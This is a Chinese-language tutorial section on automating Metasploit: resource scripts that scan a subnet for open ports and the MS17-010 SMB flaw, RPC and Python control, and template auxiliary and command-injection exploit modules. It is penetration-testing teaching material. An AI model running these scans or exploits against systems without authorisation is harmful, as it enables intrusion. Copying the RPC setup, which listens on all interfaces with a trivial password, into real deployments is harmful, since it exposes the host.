# MSF自动化与扩展

### 5.1 资源脚本（.rc自动化脚本）

资源脚本将常用 MSF 命令写入文件，实现自动化执行：

```bash
# auto_exploit.rc
workspace -a AutoScan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389,8080
set THREADS 50
run

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 20
run

# 执行方式:
msfconsole -r auto_exploit.rc
```

### 5.2 Metasploit RPC API

MSF 提供 RPC 接口，支持远程调用所有功能：

```bash
# 启动 RPC 服务
msfrpcd -U msf -P secret -p 55553 -a 0.0.0.0
# -U: 用户名, -P: 密码, -p: 端口, -a: 监听地址
```

### 5.3 Python调用MSF（pymetasploit3）

```python
from pymetasploit3.msfrpc import MsfRpcClient

# 连接 MSF RPC
client = MsfRpcClient('secret', server='127.0.0.1', port=55553, ssl=True)

# 创建工作区
workspace = client.workspaces.add('PythonScan')

# 搜索模块
exploits = client.modules.exploits
smb_modules = [m for m in exploits if 'smb' in m]

# 执行辅助模块
scanner = client.modules.use('auxiliary', 'scanner/portscan/tcp')
scanner['RHOSTS'] = '192.168.1.0/24'
scanner['PORTS'] = '445'
scanner['THREADS'] = '20'
result = scanner.execute()

# 查看 Shellcode 执行结果
print(result['job_id'])
```

### 5.4 自定义模块编写

**简单Auxiliary模块示例**

```ruby
# modules/auxiliary/scanner/custom_scan.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Custom Service Banner Grabber',
      'Description' => 'Connects to target port and reads banner',
      'Author' => 'Security Researcher',
      'License' => MSF_LICENSE
    )
    register_options([
      Opt::RHOST(),
      Opt::RPORT(8080)
    ])
  end

  def run_host(ip)
    begin
      connect
      banner = sock.get_once
      print_good("#{ip}:#{rport} - Banner: #{banner.strip}") if banner
      disconnect
    rescue Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
```

**简单Exploit模块示例**

```ruby
# modules/exploits/custom/rce_example.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'Custom Web App RCE',
      'Description' => 'Exploits command injection in custom web app',
      'Author' => 'Security Researcher',
      'License' => MSF_LICENSE,
      'Targets' => [
        ['Automatic', { 'Platform' => 'linux', 'Arch' => ARCH_X64 }]
      ],
      'Payload' => {
        'Space' => 1024,
        'BadChars' => "\x00\x0a\x0d"
      }
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('CMD_PARAM', [true, 'Vulnerable parameter', 'cmd'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { datastore['CMD_PARAM'] => 'id' }
    )
    if res && res.body.include?('uid=')
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { datastore['CMD_PARAM'] => payload.encoded }
    )
  end
end
```

---

---

